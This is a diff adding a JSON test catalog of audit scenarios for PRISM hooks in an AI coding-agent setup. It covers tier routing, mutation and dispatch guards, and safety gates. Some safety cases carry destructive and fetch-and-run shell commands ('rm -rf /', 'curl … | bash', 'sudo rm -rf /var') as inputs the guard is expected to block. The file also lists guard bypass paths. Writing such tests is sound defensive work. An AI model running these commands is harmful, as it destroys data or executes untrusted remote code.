@@ -1,0 +1,697 @@
+{
+  "schema_version": "3.6.0",
+  "description": "PRISM audit scenarios catalog. Each scenario exercises one PRISM hook code path with curated input. The runner (tools/prism-audit-runner.mjs) spawns the target hook, pipes input_payload as JSON via stdin, captures exit code + stdout + stderr + timing, and compares against expected_*.",
+  "scenarios": [
+    {
+      "id": "CLF-001",
+      "name": "Trivial lookup → haiku",
+      "category": "classifier",
+      "capability": "tier_haiku_keyword_floor",
+      "target_hook": "hooks/prism-prompt-tier-router.mjs",
+      "input_event": "UserPromptSubmit",
+      "input_payload": {
+        "session_id": "audit-CLF-001",
+        "prompt": "what does SIGTERM mean"
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "haiku",
+      "max_duration_ms": 500,
+      "notes": "Keyword-floor low score → haiku tier",
+      "expected_tier": "haiku",
+      "expected_source": "keyword-floor"
+    },
+    {
+      "id": "CLF-002",
+      "name": "Routine implementation → sonnet",
+      "category": "classifier",
+      "capability": "tier_sonnet_keyword_floor",
+      "target_hook": "hooks/prism-prompt-tier-router.mjs",
+      "input_event": "UserPromptSubmit",
+      "input_payload": {
+        "session_id": "audit-CLF-002",
+        "prompt": "implement a debounce function with leading and trailing edge control and add unit tests"
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "sonnet",
+      "max_duration_ms": 500,
+      "notes": "Keyword-floor mid score → sonnet tier",
+      "expected_tier": "sonnet",
+      "expected_source": "keyword-floor"
+    },
+    {
+      "id": "CLF-003",
+      "name": "Novel architecture → opus + summon_panel",
+      "category": "classifier",
+      "capability": "tier_opus_summon_panel",
+      "target_hook": "hooks/prism-prompt-tier-router.mjs",
+      "input_event": "UserPromptSubmit",
+      "input_payload": {
+        "session_id": "audit-CLF-003",
+        "prompt": "design a multi-region rate limiter with per-tenant fairness, redesign architecture for 10k tenants migration"
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "opus",
+      "max_duration_ms": 500,
+      "notes": "Architecture/redesign keywords → opus + summon_panel=true",
+      "expected_tier": "opus",
+      "expected_source": "summon-panel"
+    },
+    {
+      "id": "CLF-004",
+      "name": "Force-opus prefix bypass",
+      "category": "classifier",
+      "capability": "force_opus_prefix",
+      "target_hook": "hooks/prism-prompt-tier-router.mjs",
+      "input_event": "UserPromptSubmit",
+      "input_payload": {
+        "session_id": "audit-CLF-004",
+        "prompt": "!opus-force: check the git log"
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "opus",
+      "max_duration_ms": 500,
+      "notes": "force-opus prefix overrides keyword-floor",
+      "expected_tier": "opus",
+      "expected_source": "force-opus-prefix"
+    },
+    {
+      "id": "CLF-005",
+      "name": "Allowlist slash command → opus",
+      "category": "classifier",
+      "capability": "allowlist_slash_command",
+      "target_hook": "hooks/prism-prompt-tier-router.mjs",
+      "input_event": "UserPromptSubmit",
+      "input_payload": {
+        "session_id": "audit-CLF-005",
+        "prompt": "/prism-health"
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "opus",
+      "max_duration_ms": 500,
+      "notes": "Slash command in allowlist → opus tier",
+      "expected_tier": "opus",
+      "expected_source": "allowlist-slash-command"
+    },
+    {
+      "id": "CLF-006",
+      "name": "Cache hit on repeat prompt",
+      "category": "classifier",
+      "capability": "cache_hit",
+      "target_hook": "hooks/prism-prompt-tier-router.mjs",
+      "input_event": "UserPromptSubmit",
+      "input_payload": {
+        "session_id": "audit-CLF-006",
+        "prompt": "what does SIGTERM mean"
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "haiku",
+      "max_duration_ms": 500,
+      "notes": "Re-classification of same prompt; second call should be cache-source",
+      "expected_tier": "haiku",
+      "expected_source": "keyword-floor"
+    },
+    {
+      "id": "CLF-010",
+      "name": "Multi-region rate limiter → opus",
+      "category": "classifier",
+      "capability": "tier_opus_distributed_systems",
+      "target_hook": "hooks/prism-prompt-tier-router.mjs",
+      "input_event": "UserPromptSubmit",
+      "input_payload": {
+        "session_id": "audit-CLF-010",
+        "prompt": "design a multi-region rate limiter with per-tenant fairness and phased migration"
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "opus",
+      "max_duration_ms": 500,
+      "notes": "A1: distributed-systems/scaling vocab now scores opus (was score=0/haiku)",
+      "expected_tier": "opus",
+      "expected_source": "keyword-floor"
+    },
+    {
+      "id": "CLF-011",
+      "name": "Plan expense tracker (backend+frontend) → sonnet+",
+      "category": "classifier",
+      "capability": "tier_sonnet_fullstack",
+      "target_hook": "hooks/prism-prompt-tier-router.mjs",
+      "input_event": "UserPromptSubmit",
+      "input_payload": {
+        "session_id": "audit-CLF-011",
+        "prompt": "plan an expense tracker with Node backend + React frontend"
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "sonnet|opus",
+      "max_duration_ms": 500,
+      "notes": "A1: full-stack (backend+frontend) co-presence scores at least sonnet (was haiku)"
+    },
+    {
+      "id": "CLF-012",
+      "name": "Implement secure auth (password hashing + JWT) → sonnet+",
+      "category": "classifier",
+      "capability": "tier_sonnet_security_verb_floor",
+      "target_hook": "hooks/prism-prompt-tier-router.mjs",
+      "input_event": "UserPromptSubmit",
+      "input_payload": {
+        "session_id": "audit-CLF-012",
+        "prompt": "implement secure user authentication with password hashing and JWT"
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "sonnet|opus",
+      "max_duration_ms": 500,
+      "notes": "A2: security-verb floor prevents haiku routing for security-feature build work"
+    },
+    {
+      "id": "CLF-013",
+      "name": "Guard: trivial SIGTERM question → haiku (no over-trigger)",
+      "category": "classifier",
+      "capability": "tier_haiku_trivial_guard",
+      "target_hook": "hooks/prism-prompt-tier-router.mjs",
+      "input_event": "UserPromptSubmit",
+      "input_payload": {
+        "session_id": "audit-CLF-013",
+        "prompt": "what does SIGTERM mean"
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "haiku",
+      "max_duration_ms": 500,
+      "notes": "Guard: A1+A2 changes must not over-trigger on trivial informational prompts",
+      "expected_tier": "haiku",
+      "expected_source": "keyword-floor"
+    },
+    {
+      "id": "MUT-001",
+      "name": "Parent Edit → mutation-guard passes (v5.4.0 re-scope)",
+      "category": "mutation-guard",
+      "capability": "parent_edit_passthrough",
+      "target_hook": "hooks/prism-mutation-guard.mjs",
+      "input_event": "PreToolUse",
+      "input_payload": {
+        "session_id": "audit-MUT-001",
+        "tool_name": "Edit",
+        "tool_input": {
+          "file_path": "/tmp/x.txt"
+        }
+      },
+      "setup_sentinel": {
+        "tier": "haiku",
+        "summon_panel": false,
+        "dispatched": false
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "",
+      "max_duration_ms": 500,
+      "notes": "v5.4.0 (D010 §6): mutation-guard is Bash-write-only; the clean Edit tool is no longer blocked in the parent (emits clean UTF-8). Tier-gating of parent edits is now owned solely by prism-parent-dispatch-guard — see the DSP scenarios."
+    },
+    {
+      "id": "MUT-002",
+      "name": "Parent Bash file-write → mutation-guard hard deny (BOM/bypass)",
+      "category": "mutation-guard",
+      "capability": "parent_bash_write_block",
+      "target_hook": "hooks/prism-mutation-guard.mjs",
+      "input_event": "PreToolUse",
+      "input_payload": {
+        "session_id": "audit-MUT-002",
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "Set-Content -Path y.txt -Value x"
+        }
+      },
+      "setup_sentinel": {
+        "tier": "opus",
+        "summon_panel": false,
+        "dispatched": false
+      },
+      "expected_exit_code": 2,
+      "expected_stdout_pattern": "MUTATION-GUARD",
+      "max_duration_ms": 500,
+      "notes": "v5.4.0: mutation-guard's retained unique value — parent Bash/PowerShell file-writes are still hard-denied (UTF-8 BOM hazard + orchestrator bypass). Opus sentinel proves the block is the mutation-guard's own, independent of the tier fence."
+    },
+    {
+      "id": "MUT-003",
+      "name": "Subagent bypass — parent_tool_use_id set",
+      "category": "mutation-guard",
+      "capability": "subagent_bypass_parent_tool_use_id",
+      "target_hook": "hooks/prism-mutation-guard.mjs",
+      "input_event": "PreToolUse",
+      "input_payload": {
+        "session_id": "audit-MUT-003",
+        "tool_name": "Edit",
+        "tool_input": {
+          "file_path": "/tmp/z.txt"
+        },
+        "parent_tool_use_id": "abc123"
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "",
+      "max_duration_ms": 500,
+      "notes": "parent_tool_use_id present → passthrough (subagent context)"
+    },
+    {
+      "id": "DSP-001",
+      "name": "Parent Bash (mutation) on haiku turn → deny",
+      "category": "parent-dispatch-guard",
+      "capability": "parent_mutation_haiku_deny",
+      "target_hook": "hooks/prism-parent-dispatch-guard.mjs",
+      "input_event": "PreToolUse",
+      "input_payload": {
+        "session_id": "audit-DSP-001",
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "echo x > out.txt"
+        }
+      },
+      "setup_sentinel": {
+        "tier": "haiku",
+        "summon_panel": false,
+        "dispatched": false
+      },
+      "expected_exit_code": 2,
+      "expected_stdout_pattern": "DISPATCH-GUARD",
+      "max_duration_ms": 500,
+      "notes": "v5.2.4: read-only tools (Read/Grep/Glob/LS) PASS pre-dispatch. v5.3.2: read-only Bash/PowerShell probes ALSO pass via the read-only fast path — so this scenario uses a MUTATING Bash command (redirect to a file), which is NOT fast-path-exempt and the guard still denies pre-dispatch on a haiku turn (exit 2). Read-only Bash exemption is covered by tests/v3/state/test-prism-ro-bash-fastpath.mjs."
+    },
+    {
+      "id": "DSP-002",
+      "name": "Subagent bypass — CLAUDE_CODE_ENTRYPOINT=subagent",
+      "category": "parent-dispatch-guard",
+      "capability": "subagent_bypass_env",
+      "target_hook": "hooks/prism-parent-dispatch-guard.mjs",
+      "input_event": "PreToolUse",
+      "input_payload": {
+        "session_id": "audit-DSP-002",
+        "tool_name": "Read",
+        "tool_input": {
+          "file_path": "/tmp/x"
+        }
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "",
+      "max_duration_ms": 500,
+      "notes": "Three-path bypass via env var (set in env, not payload)"
+    },
+    {
+      "id": "DSP-003",
+      "name": "Agent dispatch passthrough",
+      "category": "parent-dispatch-guard",
+      "capability": "agent_dispatch_pass",
+      "target_hook": "hooks/prism-parent-dispatch-guard.mjs",
+      "input_event": "PreToolUse",
+      "input_payload": {
+        "session_id": "audit-DSP-003",
+        "tool_name": "Agent",
+        "tool_input": {
+          "subagent_type": "general-purpose",
+          "model": "haiku"
+        }
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "",
+      "max_duration_ms": 500,
+      "notes": "Agent tool itself is allowed (it's the dispatch action)"
+    },
+    {
+      "id": "AMG-001",
+      "name": "Agent without model on sonnet sentinel — soft nudge",
+      "category": "agent-model-guard",
+      "capability": "no_model_sonnet_soft",
+      "target_hook": "hooks/prism-agent-model-guard.mjs",
+      "input_event": "PreToolUse",
+      "input_payload": {
+        "session_id": "audit-AMG-001",
+        "tool_name": "Agent",
+        "tool_input": {
+          "subagent_type": "general-purpose",
+          "prompt": "fix typo"
+        }
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "",
+      "max_duration_ms": 500,
+      "notes": "Default soft mode → advisory only, exit 0"
+    },
+    {
+      "id": "AMG-002",
+      "name": "Agent with explicit model passthrough",
+      "category": "agent-model-guard",
+      "capability": "explicit_model_pass",
+      "target_hook": "hooks/prism-agent-model-guard.mjs",
+      "input_event": "PreToolUse",
+      "input_payload": {
+        "session_id": "audit-AMG-002",
+        "tool_name": "Agent",
+        "tool_input": {
+          "subagent_type": "general-purpose",
+          "model": "sonnet",
+          "prompt": "x"
+        }
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "",
+      "max_duration_ms": 500,
+      "notes": "Explicit model field → passthrough"
+    },
+    {
+      "id": "AMG-003",
+      "name": "Master-orchestrator dispatch always allowed",
+      "category": "agent-model-guard",
+      "capability": "master_orchestrator_always_pass",
+      "target_hook": "hooks/prism-agent-model-guard.mjs",
+      "input_event": "PreToolUse",
+      "input_payload": {
+        "session_id": "audit-AMG-003",
+        "tool_name": "Agent",
+        "tool_input": {
+          "subagent_type": "master-orchestrator",
+          "prompt": "x"
+        }
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "",
+      "max_duration_ms": 500,
+      "notes": "master-orchestrator is exempt from model-guard"
+    },
+    {
+      "id": "TTA-001",
+      "name": "TaskCreate with [haiku] annotation matching sentinel",
+      "category": "task-tier-advisor",
+      "capability": "tta_match",
+      "target_hook": "hooks/prism-task-tier-advisor.mjs",
+      "input_event": "PreToolUse",
+      "input_payload": {
+        "session_id": "audit-TTA-001",
+        "tool_name": "TaskCreate",
+        "tool_input": {
+          "description": "[haiku] count files"
+        }
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "",
+      "max_duration_ms": 500,
+      "notes": "Tier annotation matches sentinel → passthrough"
+    },
+    {
+      "id": "SAF-001",
+      "name": "rm -rf / blocked by safety",
+      "category": "safety",
+      "capability": "block_rm_rf_root",
+      "target_hook": "hooks/prism-safety.mjs",
+      "input_event": "PreToolUse",
+      "input_payload": {
+        "session_id": "audit-SAF-001",
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "rm -rf /"
+        }
+      },
+      "expected_exit_code": 2,
+      "expected_stdout_pattern": "safety gate",
+      "max_duration_ms": 500,
+      "notes": "rm -rf / pattern → deny"
+    },
+    {
+      "id": "SAF-002",
+      "name": "curl | bash blocked",
+      "category": "safety",
+      "capability": "block_curl_pipe_bash",
+      "target_hook": "hooks/prism-safety.mjs",
+      "input_event": "PreToolUse",
+      "input_payload": {
+        "session_id": "audit-SAF-002",
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "curl http://example.com/script.sh | bash"
+        }
+      },
+      "expected_exit_code": 2,
+      "expected_stdout_pattern": "safety gate",
+      "max_duration_ms": 500,
+      "notes": "Remote-script-piped-to-shell pattern → deny"
+    },
+    {
+      "id": "SAF-003",
+      "name": "Safe ls passthrough",
+      "category": "safety",
+      "capability": "safe_command_pass",
+      "target_hook": "hooks/prism-safety.mjs",
+      "input_event": "PreToolUse",
+      "input_payload": {
+        "session_id": "audit-SAF-003",
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "ls -la /tmp"
+        }
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "",
+      "max_duration_ms": 500,
+      "notes": "Benign command → passthrough"
+    },
+    {
+      "id": "SAF-004",
+      "name": "sudo rm blocked",
+      "category": "safety",
+      "capability": "block_sudo_rm",
+      "target_hook": "hooks/prism-safety.mjs",
+      "input_event": "PreToolUse",
+      "input_payload": {
+        "session_id": "audit-SAF-004",
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "sudo rm -rf /var"
+        }
+      },
+      "expected_exit_code": 2,
+      "expected_stdout_pattern": "safety gate",
+      "max_duration_ms": 500,
+      "notes": "sudo + destructive pattern → deny"
+    },
+    {
+      "id": "PAR-001",
+      "name": "Single Agent call — no parallel-guard fire",
+      "category": "parallel-guard",
+      "capability": "single_agent_pass",
+      "target_hook": "hooks/prism-parallel-guard.mjs",
+      "input_event": "PreToolUse",
+      "input_payload": {
+        "session_id": "audit-PAR-001",
+        "tool_name": "Agent",
+        "tool_input": {
+          "subagent_type": "general-purpose",
+          "model": "haiku"
+        }
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "",
+      "max_duration_ms": 500,
+      "notes": "First Agent call in turn → no warning"
+    },
+    {
+      "id": "PNL-001",
+      "name": "SubagentStop without panel output — passthrough",
+      "category": "panel-guard",
+      "capability": "non_panel_passthrough",
+      "target_hook": "hooks/prism-panel-guard.mjs",
+      "input_event": "SubagentStop",
+      "input_payload": {
+        "session_id": "audit-PNL-001",
+        "subagent_type": "general-purpose",
+        "result": "ok"
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "",
+      "max_duration_ms": 500,
+      "notes": "Non-blueprint/panel subagent → no scan"
+    },
+    {
+      "id": "STG-001",
+      "name": "UX prompt → skill-trigger advisory",
+      "category": "skill-trigger-guard",
+      "capability": "ux_keyword_advisory",
+      "target_hook": "hooks/prism-skill-trigger-guard.mjs",
+      "input_event": "UserPromptSubmit",
+      "input_payload": {
+        "session_id": "audit-STG-001",
+        "prompt": "review the UX of this design and check accessibility WCAG contrast"
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "",
+      "max_duration_ms": 500,
+      "notes": "UX/accessibility regex match → emit advisory if installed skill present"
+    },
+    {
+      "id": "STG-002",
+      "name": "Plan keyword → blueprint advisory",
+      "category": "skill-trigger-guard",
+      "capability": "plan_keyword_advisory",
+      "target_hook": "hooks/prism-skill-trigger-guard.mjs",
+      "input_event": "UserPromptSubmit",
+      "input_payload": {
+        "session_id": "audit-STG-002",
+        "prompt": "plan a migration of our database"
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "",
+      "max_duration_ms": 500,
+      "notes": "Plan keyword → blueprint-prompt skill advisory"
+    },
+    {
+      "id": "LIF-001",
+      "name": "SessionStart on existing install",
+      "category": "lifecycle",
+      "capability": "session_start_normal",
+      "target_hook": "hooks/prism-session-start.mjs",
+      "input_event": "SessionStart",
+      "input_payload": {
+        "session_id": "audit-LIF-001"
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "",
+      "max_duration_ms": 1000,
+      "notes": "Standard session-start; bootstrap skips (CLAUDE_PLUGIN_ROOT unset in test env)"
+    },
+    {
+      "id": "LIF-002",
+      "name": "SessionEnd persists state",
+      "category": "lifecycle",
+      "capability": "session_end",
+      "target_hook": "hooks/prism-session-end.mjs",
+      "input_event": "Stop",
+      "input_payload": {
+        "session_id": "audit-LIF-002"
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "",
+      "max_duration_ms": 1000,
+      "notes": "Session-end metric/lesson persistence"
+    },
+    {
+      "id": "LIF-003",
+      "name": "SubagentStop logs completion",
+      "category": "lifecycle",
+      "capability": "subagent_stop",
+      "target_hook": "hooks/prism-subagent-stop.mjs",
+      "input_event": "SubagentStop",
+      "input_payload": {
+        "session_id": "audit-LIF-003",
+        "subagent_type": "general-purpose"
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "",
+      "max_duration_ms": 500,
+      "notes": "Subagent-stop sentinel update"
+    },
+    {
+      "id": "LIF-004",
+      "name": "ConfigGuard on settings change",
+      "category": "lifecycle",
+      "capability": "config_change",
+      "target_hook": "hooks/prism-config-guard.mjs",
+      "input_event": "ConfigChange",
+      "input_payload": {
+        "session_id": "audit-LIF-004"
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "",
+      "max_duration_ms": 500,
+      "notes": "Config change advisory"
+    },
+    {
+      "id": "LIF-005",
+      "name": "Memory-save nudge counter",
+      "category": "lifecycle",
+      "capability": "memory_save_nudge",
+      "target_hook": "hooks/prism-memory-save-nudge.mjs",
+      "input_event": "UserPromptSubmit",
+      "input_payload": {
+        "session_id": "audit-LIF-005",
+        "prompt": "anything"
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "",
+      "max_duration_ms": 500,
+      "notes": "Turn counter; nudge emerges only at turn 15+"
+    },
+    {
+      "id": "ACL-NTF-001",
+      "name": "ACL notify — digest with created skill emits PRISM learned notice",
+      "category": "acl",
+      "capability": "acl_notify_created_skill",
+      "target_hook": "hooks/prism-acl-audit-notify-stub.mjs",
+      "input_event": "SessionStart",
+      "input_payload": {
+        "session_id": "audit-ACL-NTF-001"
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "PRISM learned",
+      "max_duration_ms": 5000,
+      "notes": "ACL Phase-1/3: notify hook reads seeded digest (created:['watchdog-monitor-builder']) and emits the PRISM learned notice. Stub wrapper sets up isolated temp HOME — no real ~/.claude mutation, no LLM dispatch."
+    },
+    {
+      "id": "ACL-NTF-002",
+      "name": "ACL notify — empty digest emits nothing",
+      "category": "acl",
+      "capability": "acl_notify_empty_digest",
+      "target_hook": "hooks/prism-acl-notify.mjs",
+      "input_event": "SessionStart",
+      "input_payload": {
+        "session_id": "audit-ACL-NTF-002"
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "",
+      "max_duration_ms": 2000,
+      "notes": "ACL Phase-1: notify hook with no digest file (real HOME, no digest present at audit time) → exits 0, emits nothing. Safe read-only: hook only reads, never writes when digest is absent."
+    },
+    {
+      "id": "ACL-RBK-001",
+      "name": "ACL rollback guard — correction on upgraded cap triggers rollback",
+      "category": "acl",
+      "capability": "acl_rollback_on_correction",
+      "target_hook": "hooks/prism-acl-audit-rollback-stub.mjs",
+      "input_event": "correction",
+      "input_payload": {
+        "event": "correction",
+        "session_id": "audit-ACL-RBK-001",
+        "cap_name": "watchdog-monitor-builder",
+        "type": "correction",
+        "content": "Bad upgrade output"
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "",
+      "max_duration_ms": 5000,
+      "notes": "ACL Phase-3: rollback guard with seeded v2 capability + correction payload → atomically reverts to v1 snapshot. Stub wrapper sets up isolated temp HOME — no real ~/.claude mutation, no LLM dispatch."
+    },
+    {
+      "id": "ACL-RBK-002",
+      "name": "ACL rollback guard — non-correction passthrough",
+      "category": "acl",
+      "capability": "acl_rollback_guard_passthrough",
+      "target_hook": "hooks/prism-acl-rollback-guard.mjs",
+      "input_event": "dispatch",
+      "input_payload": {
+        "event": "dispatch",
+        "session_id": "audit-ACL-RBK-002",
+        "cap_name": "watchdog-monitor-builder"
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "",
+      "max_duration_ms": 2000,
+      "notes": "ACL Phase-3: rollback guard with non-correction event → passthrough (exit 0, no mutation). Safe read-only path: guard checks payload.type and exits immediately for non-correction events."
+    },
+    {
+      "id": "ACL-DET-001",
+      "name": "ACL detect — no routing log present (graceful no-op)",
+      "category": "acl",
+      "capability": "acl_detect_no_routing_log",
+      "target_hook": "hooks/prism-acl-sessionend.mjs",
+      "input_event": "SessionEnd",
+      "input_payload": {
+        "event": "SessionEnd",
+        "session_id": "audit-ACL-DET-001"
+      },
+      "expected_exit_code": 0,
+      "expected_stdout_pattern": "",
+      "max_duration_ms": 2000,
+      "notes": "ACL Phase-1: session-end hook with no routing log in real HOME → fires-and-forgets worker (or exits early if no routing log). Foreground must exit 0 immediately. Covered: graceful no-routing-log path. Deferred: full detect+promote loop (requires detached worker + polling, covered by acl-phase1-e2e.mjs)."
+    }
+  ]
+}
